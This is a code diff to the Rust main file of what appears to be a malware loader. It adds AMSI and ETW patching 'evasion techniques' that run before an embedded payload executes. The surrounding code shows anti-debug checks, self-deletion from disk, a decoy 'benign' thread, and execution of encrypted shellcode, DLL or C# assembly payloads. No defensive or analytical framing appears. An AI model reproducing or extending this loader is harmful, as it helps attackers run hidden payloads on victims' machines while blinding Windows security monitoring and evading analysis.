@@ -8,6 +8,9 @@ mod utilities;
 #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag"))]
 mod checks;
 
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
+mod evasion;
+
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 use std::env;
 
@@ -98,6 +101,20 @@ fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
     }
 }
 
+/// Run all enabled evasion techniques
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
+fn run_evasion_techniques() {
+    #[cfg(feature = "EvasionAMSISimplePatch")]
+    {
+        let _ = evasion::amsi::patch_amsi();
+    }
+
+    #[cfg(feature = "EvasionETWSimple")]
+    {
+        let _ = evasion::etw::patch_etw();
+    }
+}
+
 fn main() {
 
     // Anti-debug checks - runs all enabled checks
@@ -113,24 +130,28 @@ fn main() {
         let _ = utilities::utils::delete_self_from_disk();
     }
 
-        // Validate AES arguments FIRST if AES encryption is enabled
-        #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
-        let (aes_key, aes_iv) = parse_and_validate_aes_args();
+    // =======================================================================
+    // Benign Stuff
+    // Don't add more stuff here, put it in benign.rs
+    // =======================================================================
 
-        // =======================================================================
-        // Benign Stuff
-        // Don't add more stuff here, put it in benign.rs
-        // =======================================================================
+    benign::start_benign_thread();
 
-        benign::start_benign_thread();
+    // =======================================================================
+    // Benign Stuff ends
+    // =======================================================================
 
-        // =======================================================================
-        // Benign Stuff ends
-        // =======================================================================
+    // Run all evasion techniques before payload execution
+    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
+    run_evasion_techniques();
+
+    // Validate AES arguments FIRST if AES encryption is enabled
+    #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
+    let (aes_key, aes_iv) = parse_and_validate_aes_args();
         
-        // Execute shellcode or payload without AES decryption
-        #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
-        {
+    // Execute shellcode or payload without AES decryption
+    #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
+    {
             let payload_bytes = ENCPAYLOAD.to_vec();
             // Decide behavior based on ENCTYPE
             if ENCTYPE == "SHELLCODE" {
@@ -247,11 +268,11 @@ fn main() {
             } else if ENCTYPE == "CSHARP_ASSEMBLY" {
                 // Write C# assembly
             }
-        }
+    }
 
-        // Execute shellcode with AES decryption
-        #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
-        {
+    // Execute shellcode with AES decryption
+    #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
+    {
             let encrypted_shellcode = ENCPAYLOAD;
             if let Some(decrypted_shellcode) = decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
                 // decide based on ENCTYPE; when decrypted, payload is in decrypted_shellcode
@@ -367,7 +388,7 @@ fn main() {
                     // Do dll stuff
                 } else if ENCTYPE == "CSHARP_ASSEMBLY" {
                    // Do assembly stuff
-                }
             }
         }
+    }
 }
